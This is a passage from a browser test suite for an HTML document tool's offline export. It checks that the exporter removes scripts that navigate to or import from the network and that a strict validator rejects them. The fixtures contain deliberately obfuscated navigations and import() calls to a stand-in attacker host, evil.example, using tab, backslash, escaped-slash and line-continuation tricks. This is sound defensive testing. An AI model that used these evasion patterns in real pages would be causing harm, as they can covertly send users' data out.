  if (location.protocol === "file:") window.location.href = "ht\ttps://evil.example/tab";
})();
</script>
<script>
(function () {
  // A real BACKSLASH where a slash is expected: for a special scheme the URL parser treats the two
  // alike, so this schemeless authority resolves exactly like "//evil.example". Written with four
  // source backslashes because a JS string literal needs two per runtime backslash.
  window.__cmhBackslashExfilRan = true;
  if (location.protocol === "file:") location.replace("\\\\\\\\evil.example/back");
})();
</script>
<script>
(function () {
  // The other half of the same shape: an ESCAPED slash, which the JS string literal turns back into
  // a plain slash the URL parser reads as an authority slash.
  window.__cmhEscapedSlashExfilRan = true;
  if (location.protocol === "file:") location.href = "\\//evil.example/escaped";
})();
</script>
<script>
(function () {
  // A JavaScript LineContinuation - a backslash followed by a real line terminator - evaluates to
  // NOTHING, so the literal below IS the bare network URL. Unlike a character escape it needs no
  // decoding to see, which is why it is closed rather than left in the residual.
  window.__cmhContinuationExfilRan = true;
  if (location.protocol === "file:") location.href = "\\
https://evil.example/continued";
})();
</script>
<script>
(function () {
  // Control: a padded network URL that is only ever DISPLAYED, and a navigation to a LOCAL
  // fragment that merely starts with the same padding. Tolerating the characters a browser
  // normalizes away must not start deleting these.
  window.__cmhPaddedStringKept = "  https://docs.example.org/guide";
  if (location.hash === "#docs") location.href = " #docs-section";
})();
</script>
<script>
(function () {
  // Control: a bare "https:" scheme string and a COMPARISON against a scheme-only URL. Widening
  // the URL literal to catch the beacon above must not start deleting these.
  window.__cmhSchemeStringKept = "https:";
  if (location.href === "https:api.example.org/v1") document.title = "same";
})();
</script>
<script>
(function () {
  // Control: mentions both a navigation object and a network URL literal, but never
  // navigates to one. A strip that deleted this would break benign authored documents.
  window.__cmhBenignLocationKept = true;
  var DOCS_URL = "https://docs.example.org/guide";
  if (location.hash === "#docs" && location.href !== DOCS_URL) document.title = "docs";
})();
</script>
<script>
(function () {
  // Control: a LOCAL binding that merely happens to be named "location", and a local helper
  // named "open". Neither navigates anything, and deleting the whole script over them would
  // silently break an ordinary authored document - the costlier failure direction.
  var location = "https://api.example.org/v1";
  var open = function (u) { window.__cmhLocalOpenArg = u; };
  open("https://docs.example.org/guide");
  window.__cmhLocalShadowKept = location;
})();
</script>
<script>
(function () {
  // Control: a shadowed location OBJECT whose href is then assigned. This is the shape the
  // sink pattern matches literally, yet it navigates nothing - only the local object changes.
  var location = { href: "" };
  location.href = "https://api.example.org/v1";
  window.__cmhShadowedHrefKept = location.href;
})();
</script>`;
  const staged = stageContent(CONTENT_WITH_NAVIGATION, { key: "cmh-offline-navigation", source: "offline-navigation.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await page.route(/^https?:\/\//, async (route) => {
      const url = route.request().url();
      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
      return route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expect(exportedHtml).not.toContain("evil.example");
    expect(exportedHtml).toContain("window.__cmhBenignLocationKept = true");
    expect(exportedHtml).toContain('window.__cmhSchemeStringKept = "https:"');
    expect(exportedHtml).toContain("window.__cmhPaddedStringKept =");
    // The costlier failure direction: a benign script that merely SHADOWS `location` / `open`
    // with local bindings must survive intact, or an ordinary authored document is silently
    // broken by the export.
    expect(exportedHtml).toContain("window.__cmhLocalShadowKept = location");
    expect(exportedHtml).toContain("window.__cmhShadowedHrefKept = location.href");
    // Removing a script is content loss, so the user is told rather than left to guess - and the
    // COUNT must be right, or a miscount regression would read as a pass. Matched with a word
    // boundary, since a plain substring would also be satisfied by "14 scripts ... removed.".
    await expect(page.locator("#toast")).toContainText(/\b9 scripts that load, prefetch, or navigate to the network were removed\./);
    // A navigation that does still happen (a user-clicked link, or a script that builds the
    // URL dynamically) must at least not leak where it came from. The fixture authors a
    // PERMISSIVE `unsafe-url` policy both as a document meta and on the anchor itself, so this
    // fails unless the export really replaces the meta and strips the attribute.
    const referrerMetas = exportedHtml.match(/<meta\b[^>]*\bname=["']referrer["'][^>]*>/gi) || [];
    expect(referrerMetas).toHaveLength(1);
    expect(referrerMetas[0]).toMatch(/content=["']no-referrer["']/i);
    expect(exportedHtml).not.toMatch(/content=["']unsafe-url["']/i);
    expect(exportedHtml).not.toMatch(/http-equiv=["']Referrer-Policy["']/i);
    expect(exportedHtml).not.toMatch(/\sreferrerpolicy\s*=/i);

    const exportedPath = path.join(outDir, "offline-navigation.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    // The strict validator must not bless a hand-authored offline file that keeps the same
    // shape: the strip and the gate have to agree, or the gate certifies a file the exporter
    // no longer protects. The scheme-only spelling is checked in the same direction, since a
    // gate that only knew `https://` would certify exactly what the exporter now removes.
    const smuggles = [
      'location.href = "https://evil.example/steal";',
      'location.href = "https:evil.example/steal";',
      'location.href = " https://evil.example/steal";',
      'location.href = "ht\ttps://evil.example/steal";',
      'location.href = "\\\\\\\\evil.example/steal";',
      'location.href = "\\//evil.example/steal";',
      'location.href = "\\\nhttps://evil.example/steal";',
    ];
    for (const [i, smuggle] of smuggles.entries()) {
      const smuggledPath = path.join(outDir, "offline-navigation-smuggled-" + i + ".html");
      fs.writeFileSync(smuggledPath, exportedHtml.replace(
        "</body>", "<script>" + smuggle + "</script></body>"));
      let smuggledOut = "";
      try {
        execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", smuggledPath], { cwd: SKILL, stdio: "pipe" });
        throw new Error("the strict validator accepted a smuggled top-level navigation: " + smuggle);
      } catch (e) {
        smuggledOut = String(e.stdout || "") + String(e.stderr || "") + String(e.message || "");
      }
      // Match the specific navigation error, not just any validation failure - otherwise an
      // unrelated breakage would read as this gate working.
      expect(smuggledOut).toMatch(/matches a direct top-level navigation to a network URL/i);
    }

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    const state = await page2.evaluate(() => {
      const link = document.getElementById("docsLink");
      return {
        exfilRan: window.__cmhExfilRan === true,
        openExfilRan: window.__cmhOpenExfilRan === true,
        chainExfilRan: window.__cmhChainExfilRan === true,
        schemeOnlyExfilRan: window.__cmhSchemeOnlyExfilRan === true,
        paddedExfilRan: window.__cmhPaddedExfilRan === true,
        tabExfilRan: window.__cmhTabExfilRan === true,
        backslashExfilRan: window.__cmhBackslashExfilRan === true,
        escapedSlashExfilRan: window.__cmhEscapedSlashExfilRan === true,
        continuationExfilRan: window.__cmhContinuationExfilRan === true,
        schemeStringKept: window.__cmhSchemeStringKept,
        paddedStringKept: window.__cmhPaddedStringKept,
        benignKept: window.__cmhBenignLocationKept === true,
        localShadowKept: window.__cmhLocalShadowKept,
        localOpenArg: window.__cmhLocalOpenArg,
        shadowedHrefKept: window.__cmhShadowedHrefKept,
        // The anchor itself must survive with its href intact - only the permissive
        // referrerpolicy is taken away, so the export is not just deleting the link.
        linkHref: link && link.getAttribute("href"),
        linkPolicy: link && link.getAttribute("referrerpolicy"),
        docPolicy: (document.querySelector('meta[name="referrer"]') || {}).content,
      };
    });
    expect(state.exfilRan).toBe(false);
    expect(state.openExfilRan).toBe(false);
    expect(state.chainExfilRan).toBe(false);
    expect(state.schemeOnlyExfilRan).toBe(false);
    expect(state.paddedExfilRan).toBe(false);
    expect(state.tabExfilRan).toBe(false);
    expect(state.backslashExfilRan).toBe(false);
    expect(state.escapedSlashExfilRan).toBe(false);
    expect(state.continuationExfilRan).toBe(false);
    expect(state.schemeStringKept).toBe("https:");
    expect(state.paddedStringKept).toBe("  https://docs.example.org/guide");
    expect(state.benignKept).toBe(true);
    expect(state.localShadowKept).toBe("https://api.example.org/v1");
    expect(state.localOpenArg).toBe("https://docs.example.org/guide");
    expect(state.shadowedHrefKept).toBe("https://api.example.org/v1");
    expect(state.linkHref).toBe("https://docs.example.org/guide");
    expect(state.linkPolicy).toBeNull();
    expect(state.docPolicy).toBe("no-referrer");
    expect(page2.url()).toBe(fileUrl(exportedPath));
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("NonShareable export ignores region marker text in content (CMH-FWDCOMPAT-01)", async ({ page }) => {
  const staged = stageNonShareable({
    mutate: (html) => html.replace(
      /(<main\b[^>]*id="commentRoot"[\s\S]*?<!-- BEGIN: commentable-html - CONTENT[^>]*-->)[\s\S]*?(<!-- END: commentable-html - CONTENT -->)/,
      '$1\n<h1>Region marker prose</h1>\n<pre>\nBEGIN: commentable-html - CSS\n</pre>\n$2'
    ),
  });
  try {
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnSaveHtmlTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expect(exportedHtml).toMatch(/<pre\b[\s\S]*BEGIN: commentable-html - CSS[\s\S]*<\/pre>/);
    expectForwardCompatibleContract(exportedHtml, "shareable");
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

// The offline export replaces the CDN mermaid loader with its own vendored-inline re-init; that
// re-init must carry the same "render hidden diagrams off-screen with mermaid.render()" logic as the
// live loader, so an offline-exported report with a diagram in a collapsed section renders it
// correctly at load (not as a broken zero-size layout), with zero network (CMH-MMD-07).
test("CMH-MMD-07: Export Offline renders a collapsed-section diagram correctly at load with zero network", async ({ page, browser }) => {
  test.setTimeout(60000);
  const CONTENT_COLLAPSED = `
<section><h2>Intro</h2><p id="intro-note">lead-in prose so the content column is wide.</p></section>
<section class="cmh-section-collapsed" id="sec-diagram"><h2>Narrative arc</h2>
<pre class="mermaid cm-skip">flowchart LR
  A["Act 1<br/>The Gap"] --> B["Act 2<br/>Flagship"] --> C["Act 3<br/>Tour"] --> D["Act 4<br/>Dev"] --> E["Act 5<br/>Hood"] --> F["Act 6<br/>Close"]
</pre></section>`;
  const staged = stageContent(CONTENT_COLLAPSED, { key: "cmh-offline-collapsed-mmd", source: "offline-collapsed.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await page.setViewportSize({ width: 1600, height: 900 });
    await routeRichContentLocal(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);
    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/mermaid");

    const exportedPath = path.join(outDir, "offline-collapsed.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext({ offline: true });
    const page2 = await ctx2.newPage();
    const external = [];
    page2.on("request", (request) => { if (/^https?:\/\//.test(request.url())) external.push(request.url()); });
    await page2.setViewportSize({ width: 1600, height: 900 });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    // The diagram is rendered off-screen at load even though its section stays collapsed, with zero
    // network - so its nodes exist and are correctly laid out without any reveal.
    await expect
      .poll(() => page2.locator("#sec-diagram pre.mermaid svg g.node").count(), { timeout: 20000 })
      .toBe(6);
    const viewBoxWidth = await page2.evaluate(() => {
      const svg = document.querySelector("#sec-diagram pre.mermaid svg");
      const vb = (svg.getAttribute("viewBox") || "").split(/\s+/).map(Number);
      return vb.length === 4 ? vb[2] : 0;
    });
    expect(viewBoxWidth).toBeGreaterThan(400);
    expect(external).toEqual([]);
  } finally {
    await server.close();
    if (ctx2) await ctx2.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

// The exporter's chart-canvas selector is deliberately a SUPERSET of what any one renderer draws, so
// the SHAPE of a canvas is not evidence that Chart.js is needed: a canvas carrying
// data-cmh-chart-points / data-cmh-chart-source is drawn by the runtime's own 2D renderer
// (renderInteractiveChart) and never calls Chart.js. Inlining the library for such a document ships
// ~1 MB of dead weight in every offline export (CMH-OFFLINE-06).
const BUILTIN_CHART_CONTENT = `
<h1>Built-in chart</h1>
<p id="builtin-chart-note">This chart is drawn by the built-in renderer, not by Chart.js.</p>
<figure class="chart" aria-labelledby="builtin-chart-cap">
  <div class="chart-wrap cm-skip" style="position: relative; height: 180px; max-height: 180px; overflow: hidden;">
    <canvas id="builtinChart" class="cmh-chart" width="360" height="180" role="img" aria-label="Built-in bar chart"
      data-cmh-chart-points='[{"label":"one","value":4},{"label":"two","value":9},{"label":"three","value":6}]'></canvas>
  </div>
  <figcaption id="builtin-chart-cap">Built-in canvas chart.</figcaption>
</figure>`;

test("CMH-OFFLINE-06: Export Offline omits Chart.js for a document only the built-in renderer draws", async ({ page, browser }) => {
  test.setTimeout(60000);
  const staged = stageContent(BUILTIN_CHART_CONTENT, { key: "cmh-offline-builtin-chart", source: "offline-builtin-chart.html" });
  // Seed a library this exporter inlined on an earlier pass, as a re-export of an older offline file
  // carries. It must be removed by its marker (and must not count as evidence that the document
  // needs the library), so the export neither keeps it nor grows a second copy.
  fs.writeFileSync(staged.html, fs.readFileSync(staged.html, "utf8").replace(
    "</head>",
    '<script data-cmh-offline-lib="chartjs">window.__staleInlinedLib = true; /* new Chart( */</script>\n</head>'));
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    // The live document draws the chart with the built-in renderer and never defines Chart.
    expect(await page.evaluate(() => typeof window.Chart)).toBe("undefined");
    expect(await page.evaluate(() => {
      const c = document.getElementById("builtinChart");
      return c && c._cmhChart ? c._cmhChart.points.length : 0;
    })).toBe(3);

    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    // No library, and no MIT notice for a library that is not there.
    expect(exportedHtml).not.toContain('data-cmh-offline-lib="chartjs"');
    expect(exportedHtml).not.toContain("__staleInlinedLib");
    expect(exportedHtml).not.toContain("Third-party notice - Chart.js");
    expect(exportedHtml).not.toContain('data-cmh-offline-lib="mermaid"');
    expect(exportedHtml).not.toContain('id="cmhVendoredRichLibs"');
    expect(networkLoadRefs(exportedHtml)).toEqual([]);

    const exportedPath = path.join(outDir, "offline-builtin-chart.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    // Never provision less than the renderer draws: the chart still renders, with zero network.
    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    const state = await page2.evaluate(() => {
      const c = document.getElementById("builtinChart");
      return { hasChart: typeof window.Chart !== "undefined", points: c && c._cmhChart ? c._cmhChart.points.length : 0 };
    });
    expect(state.hasChart).toBe(false);
    expect(state.points).toBe(3);
    expect(external).toEqual([]);

    // Re-exporting the offline file stays library-free and does not accumulate a second copy.
    await installDownloadTextCapture(page2);
    await page2.reload();
    await ready(page2);
    await openToolbarMenu(page2);
    await Promise.all([
      page2.waitForEvent("download"),
      page2.locator("#btnExportOfflineTop").click(),
    ]);
    const reExported = await capturedDownloadText(page2);
    expect(reExported).not.toContain('data-cmh-offline-lib="chartjs"');
    expect(reExported).not.toContain("Third-party notice - Chart.js");
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("CMH-OFFLINE-06: Export Offline still inlines Chart.js when the document constructs a Chart on a built-in canvas", async ({ page, browser }) => {
  // The superset selector is load-bearing: an author may attach their own Chart.js to ANY canvas,
  // including one that also carries the built-in data attributes. Evidence that the document uses
  // the library must win over the "the built-in renderer draws it" shortcut, or the export would
  // drop a library its own chart needs. The second case pins the INDIRECT construction that a
  // literal `new Chart(` detector would miss.
  test.setTimeout(90000);
  const cases = [
    {
      key: "direct",
      script: `
(function () {
  var el = document.getElementById("builtinChart");
  if (!el || typeof Chart === "undefined") return;
  window.__authorChartBuilt = true;
  new Chart(el, { type: "bar", data: { labels: ["one"], datasets: [{ label: "Values", data: [4] }] }, options: { animation: false, responsive: false } });
})();`,
    },
    {
      key: "aliased",
      script: `
// Chart bundle: chart.umd.min.js
(function () {
  var el = document.getElementById("builtinChart");
  var C = window.Chart;
  if (!el || !C) return;
  window.__authorChartBuilt = true;
  var chart = new C(el, { type: "bar", data: { labels: ["one"], datasets: [{ label: "Values", data: [4] }] }, options: { animation: false, responsive: false } });
  return chart;
})();`,
    },
    {
      key: "module",
      type: ' type="module"',
      script: `
const el = document.getElementById("builtinChart");
const C = window.Chart;
if (el && C) {
  window.__authorChartBuilt = true;
  new C(el, { type: "bar", data: { labels: ["one"], datasets: [{ label: "Values", data: [4] }] }, options: { animation: false, responsive: false } });
}`,
    },
  ];
  for (const variant of cases) {
    const content = BUILTIN_CHART_CONTENT
      + '\n<script src="https://cdn.jsdelivr.net/npm/chart.js@4.5.1/dist/chart.umd.js"></script>\n<script'
      + (variant.type || "") + ">" + variant.script + "\n</script>";
    const staged = stageContent(content, { key: "cmh-offline-author-chart-" + variant.key, source: "offline-author-chart.html" });
    const outDir = makeTmpDir();
    let ctx2;
    try {
      await routeRichContentLocal(page);
      await installDownloadTextCapture(page);
      await page.goto(fileUrl(staged.html));
      await ready(page);
      // A module script is deferred, so wait for the author chart rather than sampling once.
      await page.waitForFunction(() => window.__authorChartBuilt === true);

      await openToolbarMenu(page);
      await Promise.all([
        page.waitForEvent("download"),
        page.locator("#btnExportOfflineTop").click(),
      ]);
      const exportedHtml = await capturedDownloadText(page);
      expect(exportedHtml, `${variant.key}: Chart.js inlined`).toContain('data-cmh-offline-lib="chartjs"');
      expect(exportedHtml, `${variant.key}: MIT notice travels with it`).toContain("Third-party notice - Chart.js");
      expect(networkLoadRefs(exportedHtml)).toEqual([]);

      // The library must be inlined BEFORE the constructing script runs, so prove it by reopening
      // the export offline rather than by asserting the marker alone.
      const exportedPath = path.join(outDir, "offline-author-chart.html");
      fs.writeFileSync(exportedPath, exportedHtml);
      ctx2 = await browser.newContext();
      const page2 = await ctx2.newPage();
      const external = [];
      await page2.route(/^https?:\/\//, async (route) => {
        external.push(route.request().url());
        await route.abort();
      });
      // addInitScript only applies to navigations that follow it, so install before the goto.
      await installDownloadTextCapture(page2);
      await page2.goto(fileUrl(exportedPath));
      await ready(page2);
      await page2.waitForFunction(() => window.__authorChartBuilt === true);
      expect(await page2.evaluate(() => typeof window.Chart !== "undefined"),
        `${variant.key}: Chart global present offline`).toBe(true);
      expect(external).toEqual([]);
    } finally {
      if (ctx2) await ctx2.close();
      fs.rmSync(staged.dir, { recursive: true, force: true });
      fs.rmSync(outDir, { recursive: true, force: true });
    }
  }
});

test("CMH-OFFLINE-06: evidence covers a head-placed legacy-typed constructor and unusable built-in data", async ({ page, browser }) => {
  // Two branches that a shape-only or literal-constructor detector would miss: a constructing script
  // in the HEAD (which must be hoisted below the inlined library or it runs first) declared with a
  // legacy but still-executable script type, and a canvas whose built-in data cannot draw anything,
  // so the built-in renderer is NOT what covers it.
  test.setTimeout(90000);
  const outDir = makeTmpDir();
  const stagedHead = stageContent(BUILTIN_CHART_CONTENT, { key: "cmh-offline-head-ctor", source: "offline-head-ctor.html" });
  const emptyData = BUILTIN_CHART_CONTENT.replace(/data-cmh-chart-points='[^']*'/, "data-cmh-chart-points=''");
  const stagedEmpty = stageContent(emptyData, { key: "cmh-offline-empty-data", source: "offline-empty-data.html" });
  let ctx2;
  try {
    expect(emptyData).toContain("data-cmh-chart-points=''");
    fs.writeFileSync(stagedHead.html, fs.readFileSync(stagedHead.html, "utf8").replace(
      "</head>",
      '<script type="text/ecmascript">\nwindow.addEventListener("DOMContentLoaded", function () {\n'
      + '  var el = document.getElementById("builtinChart");\n  var C = window.Chart;\n'
      + '  if (!el || !C) return;\n  window.__headChartBuilt = true;\n'
      + '  new C(el, { type: "bar", data: { labels: ["one"], datasets: [{ data: [4] }] }, options: { animation: false, responsive: false } });\n'
      + "});\n</script>\n</head>"));

    await routeRichContentLocal(page);
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(stagedHead.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const headExport = await capturedDownloadText(page);
    expect(headExport, "a legacy-typed head constructor is evidence").toContain('data-cmh-offline-lib="chartjs"');
    const exportedPath = path.join(outDir, "offline-head-ctor.html");
    fs.writeFileSync(exportedPath, headExport);
    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    await page2.waitForFunction(() => window.__headChartBuilt === true);
    expect(external).toEqual([]);

    // A canvas whose inline data cannot produce a point is not one the built-in renderer draws, so
    // the library still travels rather than leaving the canvas blank.
    await page.goto(fileUrl(stagedEmpty.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(await capturedDownloadText(page), "unusable built-in data still provisions the library")
      .toContain('data-cmh-offline-lib="chartjs"');
  } finally {
    if (ctx2) await ctx2.close();
    fs.rmSync(stagedHead.dir, { recursive: true, force: true });
    fs.rmSync(stagedEmpty.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("Export Offline fails loudly when a rich document has no vendored payload (CMH-SIZE-01)", async ({ page }) => {
  // The payload is now stripped from documents that do not use rich content (CMH-SIZE-01). The
  // hazard that creates is the OTHER direction: a document that DOES use mermaid or a chart but
  // whose payload is absent - a hand-edited or legacy file. It must fail visibly rather than
  // silently downloading an export whose diagrams and charts will never render.
  test.setTimeout(60000);
  const staged = stageContent(CONTENT, { key: "cmh-offline-nopayload", source: "offline-nopayload.html" });
  const before = fs.readFileSync(staged.html, "utf8");
  // Cut the payload out by INDEX rather than with a replace() pattern. This is a test fixture
  // removing one known element, not a sanitizer, and a regex here reads to CodeQL as an
  // incomplete multi-character sanitization.
  const idAt = before.indexOf('id="cmhVendoredRichLibs"');
  expect(idAt).toBeGreaterThan(-1);
  const openAt = before.lastIndexOf("<script", idAt);
  const closeAt = before.indexOf("</script>", idAt);
  expect(openAt).toBeGreaterThan(-1);
  expect(closeAt).toBeGreaterThan(openAt);
  const stripped = before.slice(0, openAt) + before.slice(closeAt + "</script>".length);
  expect(stripped.length).toBeLessThan(before.length - 1000000);
  expect(stripped).not.toContain('id="cmhVendoredRichLibs">{"encoding"');
  fs.writeFileSync(staged.html, stripped);

  const server = await startStaticServer(staged.dir);
  try {
    await routeRichContentLocal(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);

    // Use the TOOLBAR export entry: the sidebar menu only appears once a comment exists, and
    // this document needs no comments to reproduce the failure.
    await openToolbarMenu(page);
    await expect(page.locator("#btnExportOfflineTop")).toBeVisible();
    const downloads = [];
    page.on("download", (d) => downloads.push(d));
    await page.locator("#btnExportOfflineTop").click();

    // A visible, assertive error naming the missing bundle - not a silent broken download.
    const toast = page.locator("#toast");
    await expect(toast).toContainText(/missing the vendored/i, { timeout: 15000 });
    await expect(toast).toBeVisible();
    expect(downloads).toHaveLength(0);
  } finally {
    await server.close();
  }
});

test("CMH-OFFLINE-07: re-exporting an already-offline document reuses its inlined libraries", async ({ page, browser }) => {
  test.setTimeout(120000);
  // An Offline export removes the vendored payload it consumed, so the file it produces carries the
  // libraries inline and no payload at all. Re-exporting THAT file must reuse the copies already in
  // it rather than demanding a payload that no longer exists.
  const staged = stageContent(CONTENT, { key: "cmh-offline-reexport", source: "offline-reexport.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  let ctx3;
  try {
    await routeRichContentLocal(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await page.waitForFunction(() => !!document.querySelector("#commentRoot pre.mermaid svg"), null, { timeout: 20000 });

    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const onceHtml = await capturedDownloadText(page);
    expect(onceHtml).toContain('data-cmh-offline-lib="mermaid"');
    expect(onceHtml).toContain('data-cmh-offline-lib="chartjs"');
    expect(onceHtml).not.toContain('id="cmhVendoredRichLibs"');
    const oncePath = path.join(outDir, "offline-once.html");
    fs.writeFileSync(oncePath, onceHtml);

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external2 = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external2.push(route.request().url());
      await route.abort();
    });
    await installDownloadTextCapture(page2);
    await page2.goto(fileUrl(oncePath));
    await ready(page2);
    await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");

    await openToolbarMenu(page2);
    // The download event IS the assertion that the export did not fail: on the old code the export
    // threw and showed an error toast, so no download ever arrived and this timed out.
    await Promise.all([
      page2.waitForEvent("download"),
      page2.locator("#btnExportOfflineTop").click(),
    ]);
    const twiceHtml = await capturedDownloadText(page2);

    // Exactly one copy of each library, its init shim, and each MIT notice - a re-export reuses what
    // is already there and never accumulates a second megabyte.
    expect((twiceHtml.match(/data-cmh-offline-lib="mermaid"/g) || []).length).toBe(1);
    expect((twiceHtml.match(/data-cmh-offline-lib="chartjs"/g) || []).length).toBe(1);
    expect((twiceHtml.match(/data-cmh-offline-lib-init="mermaid"/g) || []).length).toBe(1);
    expect((twiceHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
    expect((twiceHtml.match(/Third-party notice - Chart\.js/g) || []).length).toBe(1);
    const notices = [...twiceHtml.matchAll(/<!--([\s\S]*?)-->/g)].map((m) => m[1]);
    expect(notices.find((c) => c.includes("Third-party notice - mermaid"))).toContain("Copyright (c) 2014 - 2022 Knut Sveidqvist");
    expect(notices.find((c) => c.includes("Third-party notice - Chart.js"))).toContain("Copyright (c) 2014-2024 Chart.js Contributors");
    expect(networkLoadRefs(twiceHtml)).toEqual([]);
    expect(twiceHtml).not.toContain('id="cmhVendoredRichLibs"');
    expect(external2).toEqual([]);

    const twicePath = path.join(outDir, "offline-twice.html");
    fs.writeFileSync(twicePath, twiceHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", twicePath], { cwd: SKILL, stdio: "pipe" });

    // The twice-exported file still renders its diagram and its chart with zero network.
    ctx3 = await browser.newContext();
    const page3 = await ctx3.newPage();
    const external3 = [];
    await page3.route(/^https?:\/\//, async (route) => {
      external3.push(route.request().url());
      await route.abort();
    });
    await page3.goto(fileUrl(twicePath));
    await ready(page3);
    await expect(page3.locator("#commentRoot pre.mermaid svg").first()).toBeVisible();
    expect(await page3.evaluate(() => {
      const chart = window.Chart && window.Chart.getChart && window.Chart.getChart("offlineChart");
      return chart && chart.data && chart.data.datasets ? chart.data.datasets.length : 0;
    })).toBe(1);
    expect(external3).toEqual([]);
  } finally {
    if (ctx3) await ctx3.close();
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});
// Every type the HTML spec calls a JavaScript MIME type - a browser executes all of them, so both
// offline strips must treat all of them as code. Written out literally (not derived from the
// runtime) so a type dropped from the predicate loses its coverage here too.
const RUNNABLE_SCRIPT_TYPES = [
  "text/javascript", "application/javascript",
  "text/x-javascript", "application/x-javascript",
  "text/ecmascript", "application/ecmascript",
  "text/x-ecmascript", "application/x-ecmascript",
  "text/javascript1.0", "text/javascript1.1", "text/javascript1.2",
  "text/javascript1.3", "text/javascript1.4", "text/javascript1.5",
  "text/jscript", "text/livescript",
];
// Genuinely non-executable: data or transpiler-only. Widening the predicate must not start
// deleting these - they are content, not code.
const INERT_SCRIPT_TYPES = ["text/template", "application/json", "text/x-handlebars-template"];

function typeSlug(type) {
  return type.replace(/[^a-z0-9]+/gi, "-");
}

// Built by concatenation rather than nested template literals: a template literal interpolating
// another one confuses the spec-reference checker's title scanner, which then cannot see the test
// titles defined after it.
function scriptBlock(type, marker, importTarget) {
  return '<script type="' + type + '">\n'
    + "/* " + marker + " */\n"
    + 'import("https://evil.example/' + importTarget + '").catch(function () {});\n'
    + "</script>";
}

const LEGACY_TYPE_CONTENT = [
  "<h1>Legacy script MIME types</h1>",
  '<p id="legacy-note">A legacy executable script type still runs in a browser.</p>',
].concat(
  RUNNABLE_SCRIPT_TYPES.map((t) => scriptBlock(t, "cmh-runnable-" + typeSlug(t), "egress-" + typeSlug(t) + ".js")),
  [
    '<script type="application/x-javascript">',
    "/* cmh-legacy-mermaid-loader */",
    'if (window.mermaid) window.mermaid.run({ querySelector: "pre.mermaid" });',
    "</script>",
